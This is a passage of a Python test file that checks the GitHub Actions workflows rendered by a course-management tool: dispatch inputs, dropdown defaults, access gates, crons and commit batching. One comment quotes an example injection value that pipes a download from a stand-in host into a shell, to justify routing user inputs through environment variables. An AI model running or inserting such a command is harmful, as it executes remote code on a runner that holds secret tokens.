"""The workflow renderers must emit GitHub-parseable YAML with the right inputs/jobs.

A typo in any of these silently breaks a faculty button for every course, so the cheapest
useful guard is: render -> yaml.safe_load -> assert the contract. No network.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml
from conftest import workflow_inputs, workflow_jobs

from dsl_course import (
    mailer,
    profile_readme,
    seed,
    workflows_place,
    workflows_render,
)

ROOT = Path(__file__).resolve().parents[1]

# GitHub's hard cap on workflow_dispatch inputs - both Release materials variants must
# stay under it (they spend 5 of the 10, with nothing render-time-variable left to grow).
GITHUB_MAX_DISPATCH_INPUTS = 10

# The five inputs of a Release materials button, in the order they must appear: exactly a
# schedule.yml `deploy:` entry's fields, plus the cohort org - ordered source-then-target
# (what to copy, then where it lands) and numbered 1-5 in their descriptions to match.
RELEASE_INPUTS = [
    "course_source_repo",
    "course_source_path",
    "cohort_org",
    "cohort_dest_repo",
    "cohort_dest_path",
]

# Every workflow renderer, rendered -> a "it parses, and it's gated" sweep. Completeness
# is enforced by test_every_renderer_is_covered_by_the_yaml_sweep below, so a new button
# cannot ship without passing through yaml.safe_load.
ALL_RENDERED = {
    "release": workflows_render.render_release(
        ["Cohort-f2026"], "course-materials-f2026"
    ),
    "central_release": workflows_render.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"]
    ),
    "provision": workflows_render.render_provision(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "collect_submissions": workflows_render.render_collect_submissions(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "sync_membership": workflows_render.render_sync_membership(["Cohort-f2026"]),
    "send_codes": workflows_render.render_send_codes(),
    "distribute_grades": workflows_render.render_distribute_grades(["Cohort-f2026"]),
    "bootstrap_cohort": workflows_render.render_bootstrap_cohort(),
    "refresh": workflows_render.render_refresh(),
    "generate_syllabus": workflows_render.render_generate_syllabus(
        ["course-materials-f2026"], ["Cohort-f2026"]
    ),
    "new_materials": workflows_render.render_new_materials(),
    "new_assignment": workflows_render.render_new_assignment(),
    "sync_site": workflows_render.render_sync_site(["Cohort-f2026"]),
    "publish_site": workflows_render.render_publish_site(["course-materials-f2026"]),
    "status": workflows_render.render_status(["Cohort-f2026"]),
    "scheduler": workflows_render.render_scheduler(),
}

# The renderers with no check-team gate: neither a cron run nor a repository_dispatch has
# an actor to check, and each job only re-calls idempotent functions (the scheduler's
# releases, refresh's re-seeding, the codes send's `code_sent_at` idempotence).
UNGATED = {"scheduler", "refresh", "send_codes"}

# The seeded crons. Nobody watches them, and GitHub emails a scheduled-run failure only to
# whoever last committed the cron file - the bot - so each has to report itself.
CRONS = {"sync_membership", "sync_site", "refresh", "publish_site", "scheduler"}

# Every renderer whose run ends in `seed refresh` - and the subset that may join a shared
# concurrency group. See test_only_the_nightly_refresh_joins_the_seed_refresh_group.
SEED_REFRESH = {"refresh", "new_materials", "new_assignment", "bootstrap_cohort"}
SEED_REFRESH_GROUPED = {"refresh"}

# Job time budgets, per workflow, where they differ from the ordinary 30 minutes. A
# timeout that fires on a HEALTHY run is an outage, not a safety net: grading budgets 300s
# per submission subprocess and walks a cohort serially, and Bootstrap cohort configures a
# whole org before converging it.
DEFAULT_TIMEOUT = 30
CHECK_TEAM_TIMEOUT = 5
# Distribute grades walks every submission repo and every gradebook in the cohort, so
# it is bounded like the other grading jobs rather than by the 30-minute default.
JOB_TIMEOUTS = {
    "collect_submissions": 120,
    "distribute_grades": 120,
    "bootstrap_cohort": 60,
}
# The scheduler is the one workflow whose jobs carry DIFFERENT budgets: it releases and
# grades in two jobs precisely so the two-hour one is never in the release's way, and giving
# the release job that budget back would hide a hung release for two hours. 60 rather than
# the ordinary 30 for releasing, because a handout provisions one repo per student across
# every cohort in series.
PER_JOB_TIMEOUTS = {"scheduler": {"release": 60, "autograde": 120}}


def _trigger(rendered: str) -> dict:
    doc = yaml.safe_load(rendered)
    return doc.get("on", doc.get(True))


# Every renderer that takes a discovered list of orgs/repos, rendered with TWO cohorts
# (and two of everything else) so dropdown ORDER is observable - ALL_RENDERED passes
# single-element lists, which cannot tell "newest first" from "oldest first".
COHORTS_2 = ["Cohort-f2025", "Cohort-f2026"]
REPOS_2 = ["course-materials-f2025", "course-materials-f2026"]
ASSIGNMENTS_2 = ["assignment-1-f2025", "assignment-1-f2026"]
DATED_RENDERED = {
    "release": workflows_render.render_release(COHORTS_2, "course-materials-f2026"),
    "central_release": workflows_render.render_central_release(REPOS_2, COHORTS_2),
    "provision": workflows_render.render_provision(COHORTS_2, ASSIGNMENTS_2),
    "collect_submissions": workflows_render.render_collect_submissions(
        COHORTS_2, ASSIGNMENTS_2
    ),
    "sync_membership": workflows_render.render_sync_membership(COHORTS_2),
    "distribute_grades": workflows_render.render_distribute_grades(COHORTS_2),
    "sync_site": workflows_render.render_sync_site(COHORTS_2),
    "publish_site": workflows_render.render_publish_site(REPOS_2),
    "status": workflows_render.render_status(COHORTS_2),
}


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_renders_valid_yaml(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert isinstance(doc, dict) and doc.get("name")
    # Every faculty workflow is a workflow_dispatch with a check-team gate.
    assert ("check-team" in workflow_jobs(ALL_RENDERED[name])) is (name not in UNGATED)


@pytest.mark.parametrize("name", sorted(DATED_RENDERED))
def test_every_org_repo_dropdown_pre_selects_the_newest(name):
    # Dropdowns are listed alphabetically, which puts the OLDEST cohort/materials repo
    # first - and GitHub selects the first option. Every one of them must therefore carry
    # an explicit `default:` naming the current year's, or faculty release last year's
    # materials to last year's cohort with one wrong click.
    for field, spec in workflow_inputs(DATED_RENDERED[name]).items():
        options = spec.get("options", [])
        if not any("2026" in o for o in options):
            continue  # a fixed vocabulary (reading-list / individual / group / ...)
        default = spec.get("default")
        # Sync enrolment's cohort_org is the one exception: it stays pinned to the
        # faculty-only sentinel, because touching a cohort must be opted into.
        if default == workflows_render._FACULTY_ONLY:
            continue
        assert default in options, f"{name}.{field} default must be one of its options"
        assert "2026" in default, f"{name}.{field} pre-selects {default}, not f2026"


def test_every_renderer_is_covered_by_the_yaml_sweep():
    # A renderer that never gets yaml.safe_load'ed can ship a typo that breaks a faculty
    # button in every course org, so the sweep above must cover ALL of them by name.
    renderers = {
        n.removeprefix("render_")
        for n in vars(workflows_render)
        if n.startswith("render_")
    }
    assert renderers == set(ALL_RENDERED)


def test_publish_site_inputs():
    inp = workflow_inputs(
        workflows_render.render_publish_site(
            ["course-materials-f2026", "course-materials-f2025"]
        )
    )
    assert set(inp) == {"source_repo", "readings_mode", "include_lectures"}
    assert inp["source_repo"]["options"] == [
        "course-materials-f2026",
        "course-materials-f2025",
    ]
    assert inp["readings_mode"]["options"] == [
        "reading-list",
        "actual-readings",
        "none",
    ]
    assert inp["readings_mode"]["default"] == "reading-list"
    assert inp["include_lectures"]["type"] == "boolean"


def test_publish_site_defaults_to_the_newest_materials_repo():
    # Publishing REPLACES what the site serves. The dropdown's default used to be the
    # alphabetically last option of the newest year, so a faculty member clicking Run with
    # the defaults republished from a code repo and wiped a live site's materials.
    inp = workflow_inputs(
        workflows_render.render_publish_site(
            [
                "course-materials-f2025",
                "course-materials-f2026",
                "course-materials-s2026",
                "lecture-code-f2026",
            ]
        )
    )
    assert inp["source_repo"]["default"] == "course-materials-f2026"


def test_publish_site_without_a_materials_repo_defaults_to_the_first_option():
    inp = workflow_inputs(
        workflows_render.render_publish_site(["lecture-code", "slides-f2026"])
    )
    assert inp["source_repo"]["default"] == "lecture-code"


def test_publish_site_has_publish_job_running_public_sync():
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    assert "publish" in workflow_jobs(rendered)
    assert "dsl_course.site public-sync" in rendered
    # include_lectures off must map to the CLI flag.
    assert "--no-include-lectures" in rendered


def test_publish_site_cron_resyncs_from_persisted_settings():
    # The only flow that used to need a human re-click: a daily cron now re-runs the last
    # publish's persisted settings (public-sync with no source args), while the manual
    # button keeps its inputs and its check-team gate exactly as before.
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "58 5 * * *"}]
    assert "workflow_dispatch" in trigger
    jobs = workflow_jobs(rendered)
    resync = jobs["resync"]
    assert resync["if"] == "github.event_name == 'schedule'"
    assert "needs" not in resync  # cron has no actor, so it skips the check-team gate
    # ...and the failure-notice steps trail every cron job, so address the work step by name
    run = next(s for s in resync["steps"] if s.get("name") == "Re-sync course website")[
        "run"
    ]
    assert "python3 -m dsl_course.site public-sync --course-org" in run
    assert "--source-repo" not in run  # no inputs: the settings come from the site repo
    assert jobs["publish"]["needs"] == "check-team"


def test_refresh_re_seeds_itself_nightly_without_a_gate():
    # Seeded workflows are frozen at seed time while the engine they call runs from central
    # main, so an org left alone drifts. The daily cron is what converges it - and it must
    # run ungated, because a scheduled run has no actor for check-team to check.
    rendered = workflows_render.render_refresh()
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "27 5 * * *"}]
    assert "workflow_dispatch" in trigger
    assert "check-team" not in rendered
    assert "needs" not in workflow_jobs(rendered)["refresh"]


def test_provision_type_choice_defaults_to_auto():
    # Manual dispatch surfaces the individual/group choice, but `auto` (follow
    # schedule.yml / the template's grading_config.yml) is the default - dispatching without
    # thinking about it must match what the schedule would have done.
    rendered = workflows_render.render_provision(
        ["Cohort-f2026"], ["assignment-4-project-f2026"]
    )
    inp = workflow_inputs(rendered)
    assert inp["type"]["options"] == ["auto", "individual", "group"]
    assert inp["type"]["default"] == "auto"
    step = workflow_jobs(rendered)["provision"]["steps"][-1]
    assert step["env"]["TYPE"] == "${{ inputs.type }}"
    assert '--type "$TYPE"' in rendered


def test_collect_submissions_refreshes_the_sheet_and_freezes_nothing():
    # The button is the on-demand half of the quarter-hourly refresh; the FREEZE belongs to
    # the cron, at the assignment's grading deadline. A button that could freeze early
    # would move what a cohort is marked on, so it passes --refresh-only and no deadline.
    rendered = workflows_render.render_collect_submissions(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    )
    inp = workflow_inputs(rendered)
    assert set(inp) == {"cohort_org", "course_source_repo", "dry_run"}
    assert inp["dry_run"]["default"] is False
    assert "dsl_course.collect" in rendered and "--refresh-only" in rendered
    assert "--deadline" not in rendered


def test_sync_membership_is_a_consolidated_reconcile():
    # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
    # --prune toggle at this level, config is always the live truth.
    rendered = workflows_render.render_sync_membership(["Cohort-f2026"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {"cohort_org"}
    assert inp["cohort_org"]["default"] == workflows_render._FACULTY_ONLY
    assert inp["cohort_org"]["options"] == [
        workflows_render._FACULTY_ONLY,
        "Cohort-f2026",
    ]
    assert "dsl_course.sync_membership" in rendered
    assert "--prune" not in rendered
    jobs = workflow_jobs(rendered)
    assert {"check-team", "sync-dispatch", "sync-auto"} <= set(jobs)
    trigger = yaml.safe_load(rendered).get("on", yaml.safe_load(rendered).get(True))
    assert set(trigger) == {
        "push",
        "repository_dispatch",
        "schedule",
        "workflow_dispatch",
    }


def test_dotgithub_readme_orients_faculty():
    # The .github repo's own README points faculty at the Actions tab where the buttons live.
    course = profile_readme.render_dotgithub_readme(
        "My-Course-E1", "My Course", is_cohort=False
    )
    assert "control panel" in course
    assert "My-Course-E1/.github/actions" in course
    # A cohort org's own `.github` is not where any of the work happens, so its README is
    # deliberately a stub that says so - naming the org, and nothing a reader would have to
    # act on. It must NOT grow into a second control panel competing with the course org's.
    cohort = profile_readme.render_dotgithub_readme(
        "My-Course-f2026", "My Course", is_cohort=True
    )
    assert "My-Course-f2026" in cohort
    assert "rarely need to touch" in cohort
    assert "/.github/actions" not in cohort


@pytest.mark.parametrize(
    "rendered",
    [
        workflows_render.render_release(
            ["Cohort-f2025", "Cohort-f2026"], "course-materials-f2026"
        ),
        workflows_render.render_central_release(
            ["course-materials-f2026"], ["Cohort-f2025", "Cohort-f2026"]
        ),
    ],
    ids=["run-from-repo", "central"],
)
def test_both_release_buttons_take_exactly_a_deploy_entrys_fields(rendered):
    # The whole point of the merged button: its inputs ARE a schedule.yml `deploy:`
    # entry (plus the cohort org), same names, same order, on BOTH variants - so what
    # faculty learn on the button reads straight across into the schedule.
    inp = workflow_inputs(rendered)
    assert list(inp) == RELEASE_INPUTS
    assert len(inp) <= GITHUB_MAX_DISPATCH_INPUTS
    assert inp["cohort_org"]["required"] is True
    assert inp["course_source_repo"]["required"] is True
    assert inp["course_source_path"]["required"] is True
    # The destination repo carries the SAME default an omitted `cohort_dest_repo:` takes in
    # schedule.yml, so the button and the plan cannot disagree about where a release lands.
    # Pre-filled rather than required-and-blank: `materials` is what the system supplies
    # either way, so showing it teaches the default, and it spares faculty hand-typing the
    # word on every release (which was the typo risk the blank box was meant to prevent).
    assert inp["cohort_dest_repo"]["default"] == "materials"
    assert inp["cohort_dest_repo"]["required"] is True
    # cohort_dest_path is the one optional box, and ships EMPTY - a `default:` on a
    # free-text field is submitted verbatim, so pre-filling puts words in the faculty
    # member's mouth. Its fallback is stated on the box instead, or it is invisible.
    assert inp["cohort_dest_path"]["required"] is False
    assert "default" not in inp["cohort_dest_path"]
    assert "blank mirrors box 2" in inp["cohort_dest_path"]["description"]
    # Labels are plain English: the schedule.yml mapping lives in the input NAMES (asserted
    # above), so no description repeats its own key back at the reader.
    for name in RELEASE_INPUTS:
        assert name not in inp[name]["description"]
    # Multi-path is discoverable from the button itself, not just the docs.
    assert "comma-separated" in inp["course_source_path"]["description"]
    # Every box is numbered in the order it is filled in - GitHub renders dispatch inputs
    # as a flat list with no grouping, so the sequence has to be in the labels.
    for n, name in enumerate(RELEASE_INPUTS, start=1):
        assert inp[name]["description"].startswith(f"{n}. ")
    # The cohort dropdown pre-selects the latest cohort, not the alphabetically first.
    assert inp["cohort_org"]["default"] == "Cohort-f2026"
    # Gone with the section machinery: no per-section checkboxes, no session list, no
    # root-files toggle, no cohort_repo dropdown.
    for retired in (
        "sessions",
        "include_root_files",
        "cohort_repo",
        "release_lectures",
    ):
        assert retired not in inp


@pytest.mark.parametrize(
    "rendered",
    [
        workflows_render.render_release(["Cohort-f2026"], "course-materials-f2026"),
        workflows_render.render_central_release(
            ["course-materials-f2026"], ["Cohort-f2026"]
        ),
    ],
    ids=["run-from-repo", "central"],
)
def test_both_release_buttons_run_the_same_executor_through_env(rendered):
    # One executor for the schedule and the button (deploy.deploy_many, reached
    # via its CLI), and every user-supplied input reaches the shell as an env var.
    step = workflow_jobs(rendered)["release"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["COURSE_SOURCE_REPO"] == "${{ inputs.course_source_repo }}"
    assert step["env"]["COURSE_SOURCE_PATH"] == "${{ inputs.course_source_path }}"
    assert step["env"]["COHORT_DEST_REPO"] == "${{ inputs.cohort_dest_repo }}"
    assert step["env"]["COHORT_DEST_PATH"] == "${{ inputs.cohort_dest_path }}"
    assert "python3 -m dsl_course.deploy" in step["run"]
    for flag in ("--course-source-path", "--cohort-dest-repo", "--cohort-dest-path"):
        assert flag in step["run"]


def test_run_from_repo_button_prefills_course_source_repo_with_its_own_repo():
    # Inside a content repo the source is almost always that repo, so it is pre-filled -
    # but as free text, not a fixed expression, so another repo in the org can be typed in.
    inp = workflow_inputs(
        workflows_render.render_release(["Cohort-f2026"], "course-materials-f2026")
    )
    assert inp["course_source_repo"]["default"] == "course-materials-f2026"
    assert "type" not in inp["course_source_repo"]  # a string field, not a choice


def test_central_button_offers_the_orgs_content_repos_as_the_source_dropdown():
    # Centrally there is no "own" repo to pre-fill, so course_source_repo is the discovered
    # dropdown (refreshed by Refresh actions), listed alphabetically but pre-selected on
    # the latest term year - the repo faculty are teaching from now.
    inp = workflow_inputs(
        workflows_render.render_central_release(
            ["course-materials-f2025", "course-materials-f2026", "lecture-code"],
            ["Cohort-f2026"],
        )
    )
    assert inp["course_source_repo"]["type"] == "choice"
    assert inp["course_source_repo"]["options"] == [
        "course-materials-f2025",
        "course-materials-f2026",
        "lecture-code",
    ]
    assert inp["course_source_repo"]["default"] == "course-materials-f2026"


def test_undated_dropdown_options_leave_the_default_to_github():
    # A course org whose repos carry no term year has no "latest" to pre-select; emitting
    # a `default:` that is not one of the options would break the workflow outright, so
    # the dropdown ships bare and GitHub selects the first option.
    inp = workflow_inputs(
        workflows_render.render_central_release(
            ["lecture-code", "slides"], ["Cohort-A"]
        )
    )
    assert "default" not in inp["course_source_repo"]
    assert "default" not in inp["cohort_org"]
    # An org code that merely ends in four digits is not a year (GRAD-E1234 != 1234 AD).
    inp = workflow_inputs(
        workflows_render.render_central_release(["mat-e1234"], ["Cohort-e1234"])
    )
    assert "default" not in inp["cohort_org"]


def test_content_repos_get_both_buttons_and_lose_the_retired_one(monkeypatch):
    # Refresh actions re-renders every run-from-repo workflow (so a fix reaches live
    # courses) - and removes release-code.yml, whose CLI no longer exists now that
    # Release materials takes any path. All of it in ONE commit: the buttons always change
    # together, and a burst of near-identical commits is noise in a repo faculty read.
    commits = []

    def fake_put_files(org, repo, files, message, *, delete=()):
        commits.append((files, list(delete), message))
        return True

    monkeypatch.setattr(workflows_place, "put_files", fake_put_files)
    assert (
        workflows_place.push_content_workflows(
            "Course",
            "course-materials-f2026",
            ["Cohort-f2026"],
            ["assignment-1-f2026"],
            "release",
        )
        == 0
    )
    assert len(commits) == 1
    files, deleted, _ = commits[0]
    pushed = {path: content.decode() for path, content in files.items()}
    assert (
        set(pushed)
        == set(workflows_place.WORKFLOWS)
        == {
            ".github/workflows/release-materials.yml",
            ".github/workflows/release-assignment.yml",
        }
    )
    assert deleted == [".github/workflows/release-code.yml"]
    # The materials button seeded into a content repo is that repo's own variant.
    materials = yaml.safe_load(pushed[".github/workflows/release-materials.yml"])
    trigger = materials.get("on", materials.get(True))
    inputs = trigger["workflow_dispatch"]["inputs"]
    assert list(inputs) == RELEASE_INPUTS
    assert inputs["course_source_repo"]["default"] == "course-materials-f2026"


def test_the_org_level_buttons_land_as_one_commit(monkeypatch):
    # Sixteen workflows rendered from one set of inputs by shared helpers: an edit to the
    # run preamble or a dropdown helper re-renders every one of them, so file-by-file
    # writes turned each such edit into a wall of sixteen near-identical commits in the
    # repo whose history faculty actually browse. The retired buttons ride along in the
    # same commit rather than earning three more.
    monkeypatch.setattr(seed, "discover_cohorts", lambda org: ["Cohort-f2026"])
    monkeypatch.setattr(
        seed, "discover_content_repos", lambda org: ["course-materials"]
    )
    monkeypatch.setattr(
        seed, "discover_assignments", lambda org: ["assignment-1-f2026"]
    )
    commits = []

    def fake_put_files(org, repo, files, message, *, delete=()):
        commits.append((repo, files, list(delete)))
        return True

    monkeypatch.setattr(seed, "put_files", fake_put_files)
    assert seed.seed_github_workflows("Course", "release") == 0
    assert len(commits) == 1
    repo, files, deleted = commits[0]
    assert repo == ".github"
    assert len(files) == 15  # three grading buttons became two
    assert all(path.startswith(".github/workflows/") for path in files)
    assert deleted == [
        ".github/workflows/sync-enrolment.yml",
        ".github/workflows/sync-teams.yml",
        ".github/workflows/status.yml",
        ".github/workflows/grade-assignment.yml",
        ".github/workflows/sync-gradebooks.yml",
        ".github/workflows/render-grades.yml",
    ]


def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
    # user-supplied input must reach the script as an env var instead.
    materials, assignment = (
        workflows_render.render_new_materials(),
        workflows_render.render_new_assignment(),
    )
    for rendered in (materials, assignment):
        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
        assert "${{" not in step["run"]
        assert step["env"]["TAG"] == "${{ inputs.tag }}"
    assert '--tag "$TAG"' in materials
    assert '--number "$NUMBER"' in assignment


def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
    wf = (ROOT / ".github" / "workflows" / "bootstrap-org.yml").read_text()
    step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["ORG"] == "${{ inputs.org }}"
    assert step["env"]["ORG_NAME"] == "${{ inputs.org_name }}"
    assert step["env"]["COURSE_CODE"] == "${{ inputs.course_code }}"


def test_choice_falls_back_when_empty():
    # An empty dropdown must still be valid YAML (a placeholder option), never blank.
    assert "(none-yet)" in workflows_render._choice([])
    inp = workflow_inputs(workflows_render.render_publish_site([]))
    assert inp["source_repo"]["options"] == ["(none-yet)"]


def test_sync_site_auto_resyncs_on_sourced_changes():
    # Sync site must auto-fire (no manual click) on the things the site reads: a push to
    # the course dsl-course.yml, a repository_dispatch from a cohort's schedule.yml, and a
    # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
    doc = yaml.safe_load(workflows_render.render_sync_site(["Cohort-f2026"]))
    trigger = doc.get("on", doc.get(True))
    assert "dsl-course.yml" in trigger["push"]["paths"]
    assert trigger["repository_dispatch"]["types"] == ["sync-site"]
    assert trigger["schedule"][0]["cron"] == "41 6 * * *"
    assert "workflow_dispatch" in trigger
    jobs = doc["jobs"]
    # the ungated auto job runs for non-manual events; the gated one needs check-team
    assert jobs["sync-auto"]["if"] == "github.event_name != 'workflow_dispatch'"
    assert "check-team" not in jobs["sync-auto"].get("needs", "")
    assert jobs["sync"]["needs"] == "check-team"


def test_classroom_config_site_dispatcher_fires_on_schedule_or_people_change():
    # Both files feed the site: schedule.yml its dates, people.yml its staff cards. A
    # people.yml edit must not have to wait for the daily cron. (people.yml also fires
    # dispatch-sync.yml - a different workflow, event type sync-membership - which is fine.)
    tmpl = (
        ROOT / "templates" / "classroom-config" / "dispatch-sync-site.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert sorted(trigger["push"]["paths"]) == ["people.yml", "schedule.yml"]
    assert "sync-site" in tmpl  # dispatches the sync-site event


def test_classroom_config_scheduler_dispatcher_fires_on_a_schedule_change():
    # GitHub delivers only a fraction of `schedule:` cron fires, so the promise that a
    # schedule.yml edit takes effect within minutes holds only if the edit itself starts a
    # run. schedule.yml alone: no other file in classroom-config moves a release moment.
    tmpl = (
        ROOT / "templates" / "classroom-config" / "dispatch-scheduled-release.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert set(trigger) == {"push"}
    assert trigger["push"]["paths"] == ["schedule.yml"]
    assert trigger["push"]["branches"] == ["main"]
    # DSL_BOT_TOKEN does every call here, so the ambient token gets no scopes at all.
    assert doc["permissions"] == {}
    # The event type the course org's Scheduled release filters `types:` on.
    assert "event_type=scheduled-release" in tmpl
    # The course org is read from THIS cohort's own pointer, never baked in at bootstrap.
    assert "contents/dsl-course.yml" in tmpl
    assert tmpl.splitlines()[0].startswith("# SYSTEM-OWNED")


def test_send_codes_only_ever_runs_off_a_roster_push():
    # A roster edit is the ONLY way codes go out: no button, no cohort dropdown, no
    # dry_run. The job is ungated (a repository_dispatch has no actor for check-team to
    # ask about) and it sends for real, because nobody is watching it.
    rendered = workflows_render.render_send_codes()
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger == {"repository_dispatch": {"types": ["send-codes"]}}
    jobs = doc["jobs"]
    assert set(jobs) == {"send-codes"}
    assert "check-team" not in str(jobs["send-codes"].get("needs", ""))
    step = jobs["send-codes"]["steps"][-1]
    assert step["env"]["DISPATCH_COHORT"] == (
        "${{ github.event.client_payload.cohort_org }}"
    )
    assert "dry-run" not in rendered and "dry_run" not in rendered
    # The trust boundary: a client_payload is written by whoever holds a COHORT's bot
    # token, so the cohort it names is checked against this course org's registry.
    assert '--dispatched-by "$COURSE"' in step["run"]
    assert step["env"]["COURSE"] == "${{ github.repository_owner }}"
    # Per cohort, off the payload alone: two cohorts pushing rosters at once must not
    # drop each other's queued send.
    assert (
        "send-codes-${{ github.event.client_payload.cohort_org }}"
        in doc["concurrency"]["group"]
    )


def test_classroom_config_roster_dispatcher_fires_send_codes_on_students_csv():
    # students.csv is the only file that feeds the codes email, and this dispatcher is the
    # only thing that fires it. It dispatches the same event type the rendered workflow
    # listens for; loop-safety is the send's own `code_sent_at` idempotence, documented in
    # the template.
    tmpl = (
        ROOT / "templates" / "classroom-config" / "dispatch-send-codes.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert trigger["push"]["paths"] == ["students.csv"]
    assert trigger["push"]["branches"] == ["main"]
    assert doc["permissions"] == {}
    assert "event_type=send-codes" in tmpl
    # The course org is read from THIS cohort's own pointer, never baked in at bootstrap.
    assert "contents/dsl-course.yml" in tmpl


def test_new_assignment_button_exposes_format_and_type():
    # The grading_config.yml vocabulary (type: individual/group) is chosen
    # on the button and recorded by the scaffold - not hand-edited in afterwards.
    rendered = workflows_render.render_new_assignment()
    inputs = workflow_inputs(rendered)
    assert inputs["format"]["options"] == ["py", "notebook"]
    assert inputs["format"]["default"] == "py"
    assert inputs["type"]["options"] == ["individual", "group"]
    assert inputs["type"]["default"] == "individual"
    step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["FORMAT"] == "${{ inputs.format }}"
    assert step["env"]["TYPE"] == "${{ inputs.type }}"
    assert '--format "$FORMAT"' in rendered and '--type "$TYPE"' in rendered


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_no_rendered_workflow_turns_on_dsl_verbose(name):
    # DSL_VERBOSE un-suppresses the per-student log lines (log.log_person) - who is
    # enrolled, who is in which team, which `<slug>-<handle>` repo exists. Every one of
    # these workflows runs in the course org's PUBLIC `.github`, whose Actions log anyone
    # can read, so the variable is for a local CLI run only and no workflow may set it.
    assert "DSL_VERBOSE" not in ALL_RENDERED[name]


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_seed_refresh_steps_carry_dsl_bot_token(name):
    # `seed refresh` propagates the token as a repo secret onto every private content repo
    # (the Free-plan delivery gap), and it reads ONLY the DSL_BOT_TOKEN env var - handing
    # it just GH_TOKEN makes it log a refusal and leave the repo with no token. Any step
    # that runs it must export both. New assignment was the button that regressed.
    for job in workflow_jobs(ALL_RENDERED[name]).values():
        for step in job.get("steps", []):
            if "seed refresh" not in step.get("run", ""):
                continue
            assert step.get("env", {}).get("DSL_BOT_TOKEN") == (
                "${{ secrets.DSL_BOT_TOKEN }}"
            ), f"{name}: '{step.get('name')}' runs seed refresh without DSL_BOT_TOKEN"


def test_validate_schedule_workflow_is_seeded_with_the_central_repo_pinned():
    # Seeded into a cohort's classroom-config, so it must carry the central repo and ref
    # baked in - the cohort repo has no other way to reach the parser.
    from dsl_course.central import CENTRAL, CENTRAL_REF
    from dsl_course.welcome import classroom_system_files

    raw = classroom_system_files(CENTRAL_REF)[
        ".github/workflows/validate-schedule.yml"
    ].decode()
    assert "__CENTRAL__" not in raw and "__CENTRAL_REF__" not in raw
    doc = yaml.safe_load(raw)
    trigger = doc.get("on", doc.get(True))

    # fires where the file is edited, and on demand
    assert trigger["push"]["paths"] == ["schedule.yml"]
    assert trigger["push"]["branches"] == ["main"]
    assert "workflow_dispatch" in trigger

    steps = doc["jobs"]["validate"]["steps"]
    central = next(s for s in steps if s.get("with", {}).get("repository"))
    assert central["with"]["repository"] == CENTRAL
    assert central["with"]["ref"] == CENTRAL_REF

    # validates the cohort's OWN file, not a fetched copy - no token needed to read it
    run = next(s for s in steps if s.get("id") == "validate")["run"]
    assert "--file ../cohort/schedule.yml --validate" in run
    assert "$GITHUB_STEP_SUMMARY" in run

    # the run must end red so the commit is marked, and needs issues:write to escalate
    assert doc["permissions"]["issues"] == "write"
    assert any("exit 1" in s.get("run", "") for s in steps)


# -------------------------------------- update_profile_readme guards its config load
# A malformed dsl-course.yml used to raise a bare yaml traceback from mid-refresh (after
# workflows were pushed, before the welcome/sample refresh), half-converging the nightly
# run. It now loads through gh_contents.load_yaml_config: absent -> fall back to the org name;
# malformed/non-mapping -> raise with a clear, logged message.


def test_update_profile_readme_absent_config_falls_back_without_crashing(monkeypatch):
    from dsl_course import profile_readme as P

    monkeypatch.setattr("dsl_course.gh_contents.get_file_content", lambda *a, **k: None)
    # profile_readme imported the name, so the module binding is what the splice reads.
    monkeypatch.setattr(P, "get_file_content", lambda *a, **k: None)
    monkeypatch.setattr(
        P,
        "list_org_repos",
        lambda org: [
            {"name": "welcome", "url": "u", "visibility": "private", "description": ""}
        ],
    )
    monkeypatch.setattr(P, "discover_cohorts", lambda org: [])
    commits = []
    monkeypatch.setattr(
        P, "put_files", lambda org, repo, files, msg, **k: commits.append(files) or True
    )
    monkeypatch.setattr(P, "log_ok", lambda *a, **k: None)

    P.update_profile_readme("Cohort-f2026", central_ref="release")  # must not raise
    # Both READMEs, using the org name as the fallback - and in ONE commit, since they are
    # rendered from the same org snapshot and always move together.
    assert len(commits) == 1
    assert set(commits[0]) == {"profile/README.md", "README.md"}


# ------------------------------------- the cohort landing page is instructor-owned, bar
# its repo table. These pin the three ways a refresh can meet an existing page.

_REPOS = [
    {"name": "welcome", "url": "u", "visibility": "PUBLIC", "description": "front door"}
]


def test_repo_table_drops_submission_and_gradebook_repos():
    from dsl_course.profile_readme import _repo_table

    # The students' landing page must not name every classmate's private repo: the topics
    # are the same ones discovery._is_infra_repo filters on.
    rows = _repo_table(
        [
            {
                "name": "welcome",
                "url": "u",
                "visibility": "PUBLIC",
                "description": "d",
                "topics": [],
            },
            {
                "name": "materials",
                "url": "u",
                "visibility": "PRIVATE",
                "description": "d",
                "topics": [],
            },
            {
                "name": "assignment-1-ada",
                "url": "u",
